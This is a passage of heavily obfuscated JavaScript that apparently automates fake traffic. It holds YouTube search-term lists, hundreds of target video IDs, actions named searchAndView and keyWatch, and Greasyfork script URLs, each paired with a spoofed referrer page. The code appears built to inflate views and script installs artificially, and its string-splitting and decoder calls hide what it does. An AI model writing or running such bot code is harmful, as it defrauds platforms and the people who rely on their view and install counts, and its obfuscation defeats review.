searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + W(0x0) + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + W(0x10) + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + V(0x16, 'PDyN') + 'craft\x20comp' + X(0xa) + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x9dd * -0x2 + 0x1a89 + -0x1 * 0x6c5)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x6f * -0x56 + 0x85d * 0x2 + -0x35fa)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x9fe + 0xac * 0x6 + -0xe03);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    W(0x19) + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    W(0x1a) + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    V(0xb, 'QmaD') + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    W(0x4) + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x14) + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + W(0xd)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x14) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + X(0x2) + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + V(0x7, '2!WL') + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0xc, 'Sx^M') + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
